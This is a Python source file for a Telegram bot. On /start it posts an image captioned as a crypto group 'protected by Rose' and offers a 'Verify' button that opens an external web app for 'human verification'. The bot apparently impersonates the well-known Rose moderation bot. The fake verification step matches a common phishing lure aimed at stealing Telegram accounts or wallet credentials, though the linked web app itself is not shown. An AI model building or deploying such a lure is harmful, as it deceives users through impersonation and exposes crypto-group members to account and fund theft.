from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, ContextTypes
from config import BOT_TOKEN

WEB_APP_URL = "https://tgapp-dfyi.onrender.com"  # Change to your actual Mini App domain
IMAGE_URL = "https://cdn4.cdn-telegram.org/file/SJWHZvScIA6FJdG3VK7Y3jWrn4q4cxPxbeBzqCd_Jvv15C9qaT2B6qae-WSVl7EXpmF0tgOBQdKjeqj6YCBslDiI3mult58UtfdPnhH1Wq9_GVvJWteCcsEtfC0zqv_hfJydQb8obwY67B6G0s3SxfAgdrqvys0O_2kqADFpAEEeSqWKcgRUMHDr1Z7tp65hsc1_8djfD1giSdVrGMfm66UQrQv51aBPsgzHuy4rMuOgcYIRO0OEc6X0LsLuapvUjlbfI1HtKI2rk6pPzr-e_6LCMyGtqVQaGsMmZQtRZXSVkF8VP6n0o3XKbAJbaW9AICPKT4wCZAhnbuaHCpa1-g.jpg"  # Hosted image URL

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 Verify", web_app=WebAppInfo(url=WEB_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Option 1: If you're using a hosted image (recommended for Telegram bots)
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=IMAGE_URL,
        caption=(
            "🌹 <b>Ram $SOL PRIVATE is being protected by Rose</b>\n\n"
            "Click below to start human verification."
        ),
        parse_mode='HTML',
        reply_markup=reply_markup
    )

    # Option 2: Use a local image file (uncomment if using local image)
    # with open("assets/rose.jpg", "rb") as image_file:
    #     await context.bot.send_photo(
    #         chat_id=update.effective_chat.id,
    #         photo=image_file,
    #         caption=(
    #             "🌹 <b>Ram $SOL PRIVATE is being protected by Rose</b>\n\n"
    #             "Click below to start human verification."
    #         ),
    #         parse_mode='HTML',
    #         reply_markup=reply_markup
    #     )

if __name__ == '__main__':
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.run_polling()
